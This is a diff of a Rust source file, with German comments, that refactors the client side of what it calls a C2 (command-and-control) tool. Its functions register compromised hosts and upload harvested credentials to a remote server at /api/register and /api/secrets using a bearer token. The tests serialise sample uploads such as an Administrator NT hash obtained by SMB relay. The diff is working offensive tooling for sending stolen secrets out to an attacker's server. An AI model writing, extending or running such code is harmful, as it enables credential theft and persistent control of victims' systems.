@@ -4,7 +4,11 @@
 //! Server-Zertifikat wird via `server_cert` (PEM-Pfad) übergeben und
 //! vertraut gemacht; eine Verifikation gegen die System-Store ist nicht
 //! möglich, da der Server selbstsignierte Zertifikate verwendet.
+//!
+//! Die Nachrichten selbst sind nicht hier definiert, sondern in
+//! `kx_core::c2` — der Agent und der Server sprechen denselben Vertrag.
 
+use kx_core::c2::{RegisterRequest, SecretUpload, PATH_REGISTER, PATH_SECRETS};
 use thiserror::Error;
 use ureq::Agent;
 
@@ -20,24 +24,6 @@ pub enum C2Error {
     /// Antwort-JSON konnte nicht geparst werden.
     #[error("Antwort-JSON ungültig: {0}")]
     Json(String),
-}
-
-/// Payload für eine Host-Registrierung.
-#[derive(Debug, serde::Serialize)]
-pub struct HostPayload {
-    pub ip: String,
-    pub hostname: Option<String>,
-    pub os: Option<String>,
-    pub status: Option<String>,
-}
-
-/// Payload für ein Secret-Upload.
-#[derive(Debug, serde::Serialize)]
-pub struct SecretPayload {
-    pub cred_type: String,
-    pub username: String,
-    pub password: String,
-    pub source: String,
 }
 
 /// C2-Client mit ureq-Agent und Auth-Token.
@@ -70,38 +56,29 @@ impl C2Client {
         })
     }
 
-    /// Registriert einen Host unter /api/register.
-    pub async fn register_host(&self, host: &HostPayload) -> Result<(), C2Error> {
-        let url = format!("{}/api/register", self.base_url);
+    /// Registriert einen Host unter `/api/register`.
+    pub async fn register_host(&self, req: &RegisterRequest) -> Result<(), C2Error> {
+        let url = format!("{}{PATH_REGISTER}", self.base_url);
         let resp = self
             .agent
             .post(&url)
             .set("Authorization", &format!("Bearer {}", self.token))
-            .send_json(ureq::serde_json::to_value(host)
+            .send_json(ureq::serde_json::to_value(req)
                 .map_err(|e| C2Error::Json(e.to_string()))?)
             .map_err(|e| C2Error::Http(e.to_string()))?;
         ensure_ok(resp).await
     }
 
-    /// Lädt ein Secret unter /api/secrets hoch.
-    pub async fn upload_secret(
-        &self,
-        host_id: &str,
-        secret: &SecretPayload,
-    ) -> Result<(), C2Error> {
-        let url = format!("{}/api/secrets", self.base_url);
-        let body = serde_json::json!({
-            "host_id": host_id,
-            "cred_type": secret.cred_type,
-            "username": secret.username,
-            "password": secret.password,
-            "source": secret.source,
-        });
+    /// Lädt ein Secret unter `/api/secrets` hoch. Die Ziel-Host-Kennung steht im
+    /// Upload selbst — sie kann nicht mehr auseinanderlaufen.
+    pub async fn upload_secret(&self, upload: &SecretUpload) -> Result<(), C2Error> {
+        let url = format!("{}{PATH_SECRETS}", self.base_url);
         let resp = self
             .agent
             .post(&url)
             .set("Authorization", &format!("Bearer {}", self.token))
-            .send_json(body)
+            .send_json(ureq::serde_json::to_value(upload)
+                .map_err(|e| C2Error::Json(e.to_string()))?)
             .map_err(|e| C2Error::Http(e.to_string()))?;
         ensure_ok(resp).await
     }
@@ -125,14 +102,38 @@ mod tests {
     use super::*;
 
     #[test]
-    fn host_payload_serializes() {
-        let host = HostPayload {
+    fn register_request_serializes_host_id() {
+        let req = RegisterRequest {
+            host_id: "192.168.1.5".into(),
             ip: "192.168.1.5".into(),
             hostname: Some("srv1".into()),
             os: Some("Windows".into()),
-            status: Some("compromised".into()),
+            status: Some(kx_core::c2::STATUS_COMPROMISED.into()),
         };
-        let v = ureq::serde_json::to_value(&host).unwrap();
+        let v = ureq::serde_json::to_value(&req).unwrap();
         assert_eq!(v["ip"], "192.168.1.5");
+        assert_eq!(v["host_id"], "192.168.1.5");
+    }
+
+    /// Der Upload trägt die Ziel-Host-Kennung selbst — es gibt keine zweite
+    /// Stelle mehr, an der sie auseinanderlaufen könnte.
+    #[test]
+    fn secret_upload_carries_its_host_id() {
+        let upload = SecretUpload {
+            host_id: "192.168.1.5".into(),
+            cred_type: "nt_hash".into(),
+            username: "Administrator".into(),
+            password: "hash".into(),
+            source: Some("smb_relay".into()),
+        };
+        let v = ureq::serde_json::to_value(&upload).unwrap();
+        assert_eq!(v["host_id"], "192.168.1.5");
+        assert_eq!(v["source"], "smb_relay");
+    }
+
+    #[test]
+    fn client_uses_the_contract_paths() {
+        assert_eq!(PATH_REGISTER, "/api/register");
+        assert_eq!(PATH_SECRETS, "/api/secrets");
     }
 }
